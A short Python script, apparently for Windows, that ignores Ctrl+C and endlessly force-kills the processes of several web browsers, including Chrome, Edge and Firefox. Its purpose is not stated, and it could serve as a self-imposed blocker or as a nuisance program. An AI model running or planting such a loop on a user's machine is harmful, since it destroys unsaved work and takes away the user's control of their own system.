from signal import signal, SIGINT, SIG_IGN
import subprocess
signal(SIGINT, SIG_IGN)
while True:
  subprocess.Popen(["taskkill","/f","/im","chrome.exe"]).wait()
  subprocess.Popen(["taskkill","/f","/im","msedge.exe"]).wait()
  subprocess.Popen(["taskkill","/f","/im","plasmafox.exe"]).wait()
  subprocess.Popen(["taskkill","/f","/im","firefox.exe"]).wait()
  subprocess.Popen(["taskkill","/f","/im","iexplore.exe"]).wait()
  subprocess.Popen(["taskkill","/f","/im","r3dfox.exe"]).wait()
